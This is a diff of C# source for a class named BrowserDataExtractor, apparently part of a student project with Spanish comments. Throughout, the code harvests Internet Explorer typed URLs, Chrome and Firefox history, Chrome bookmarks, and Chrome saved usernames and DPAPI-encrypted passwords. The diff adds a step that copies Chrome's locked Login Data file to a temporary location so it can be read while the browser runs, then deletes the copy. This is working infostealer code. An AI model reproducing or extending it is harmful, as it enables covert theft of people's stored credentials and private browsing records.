@@ -12,9 +12,9 @@ namespace TP
     public class BrowserDataExtractor : DataExtractor
     {
 
-        public BrowserDataExtractor()
+        public BrowserDataExtractor(string outputFileName)
         {
-            fileName = "chromeData";
+            fileName = outputFileName;
         }
 
         protected override string ExtractData()
@@ -28,38 +28,47 @@ namespace TP
             return "";
         }
 
-        private List<string> GetIEHistory()
+        protected List<string> GetIEHistory()
         {
-            var localKey = RegistryKey.OpenBaseKey(RegistryHive.Users, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
-            string pattern = @"S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$";
-            string[] subKeys = localKey.GetSubKeyNames();
-            List<string> pathes = new List<string>();
-            foreach (string sk in subKeys)
-            {
-                if (Regex.IsMatch(sk, pattern))
-                {
-                    pathes.Add(sk);
-                }
-            }
+            var localKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
+            //var localKey = RegistryKey.OpenBaseKey(RegistryHive.Users, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
+            //string pattern = @"S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$";
+            //string[] subKeys = localKey.GetSubKeyNames();
+            //List<string> paths = new List<string>();
+            //foreach (string sk in subKeys)
+            //{
+            //    if (Regex.IsMatch(sk, pattern))
+            //        paths.Add(sk);
+            //}
 
             List<string> history = new List<string>();
-            foreach (string path in pathes)
+            var subKey = localKey.OpenSubKey(@"Software\Microsoft\Internet Explorer\TypedURLs");
+            string[] registryKeyValue = subKey?.GetValueNames();
+
+            foreach (string key in registryKeyValue)
             {
-
-                var subKey = localKey.OpenSubKey(path + @"\Software\Microsoft\Internet Explorer\TypedURLs");
-                string[] registryKeyValue = subKey?.GetValueNames();
-
-                foreach (string key in registryKeyValue)
-                {
-                    var val = subKey?.GetValue(key);
-                    history.Add(val.ToString());
-                }
-
+                var val = subKey?.GetValue(key);
+                history.Add(val.ToString());
             }
+
+            //List<string> history = new List<string>();
+            //foreach (string path in paths)
+            //{
+
+            //    var subKey = localKey.OpenSubKey(path + @"\Software\Microsoft\Internet Explorer\TypedURLs");
+            //    string[] registryKeyValue = subKey?.GetValueNames();
+
+            //    foreach (string key in registryKeyValue)
+            //    {
+            //        var val = subKey?.GetValue(key);
+            //        history.Add(val.ToString());
+            //    }
+
+            //}
             return history;
         }
 
-        private List<string> GetChromeHistory()
+        protected List<string> GetChromeHistory()
         {
             var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
             string pattern = @"(htt(p|s)://([\w-]+\.)+[\w-]+[\w- ./?%&=]*)*";
@@ -80,7 +89,7 @@ namespace TP
             return history;
         }
 
-        private List<string> GetChromeBookmarks()
+        protected List<string> GetChromeBookmarks()
         {
             var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
             string jsonText = ReadFilePath(filePath, Encoding.Default);
@@ -92,11 +101,9 @@ namespace TP
             return jsons;
         }
 
-
-
-        private Tuple<List<string>, List<string>> GetChromeUserPassword()
+        protected Tuple<List<string>, List<string>> GetChromeUserPassword()
         {
-            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
+            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data";
             Encoding encoding = Encoding.GetEncoding(28591);
 
             string binaryText = ReadFilePath(pathWithEnv, encoding);
@@ -110,7 +117,7 @@ namespace TP
             return new Tuple<List<string>, List<string>>(usr, decPwdArray);
         }
 
-        private static List<string> GetFirefoxHistory()
+        protected List<string> GetFirefoxHistory()
         {
             var pathWithEnv = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
@@ -134,7 +141,7 @@ namespace TP
             return history;
         }
 
-        private static List<string> ExtractUser(Encoding encoding, string binaryText)
+        protected List<string> ExtractUser(Encoding encoding, string binaryText)
         {
             string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
             Regex userRegex = new Regex(pattern);
@@ -151,7 +158,7 @@ namespace TP
             return usr;
         }
 
-        private static List<string> ExtractPassword(Encoding encoding, string binaryText)
+        protected List<string> ExtractPassword(Encoding encoding, string binaryText)
         {
             string pattern = @"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)";
             Regex pwdRegex = new Regex(pattern);
@@ -169,16 +176,23 @@ namespace TP
             return decPwdArray;
         }
 
-        private static string ReadFilePath(string pathWithEnv, Encoding encoding)
+        protected string ReadFilePath(string pathWithEnv, Encoding encoding)
         {
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
             if (filePath == null)
                 return null;
-            FileStream fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
+
+            // Copia el archivo Login Data de Chrome, ya que si está en uso el navegador falla la solicitud de lectura
+            string tempFileName = Path.GetTempPath() + Path.GetRandomFileName();
+            File.Copy(filePath, tempFileName);
+            FileStream fs = File.OpenRead(tempFileName);
             StreamReader streamReader = new StreamReader(fs, encoding);
             string binaryText = streamReader.ReadToEnd();
             streamReader.Close();
             fs.Close();
+
+            // Luego de leerlo, se elimina la copia
+            File.Delete(tempFileName);
 
             return binaryText;
         }
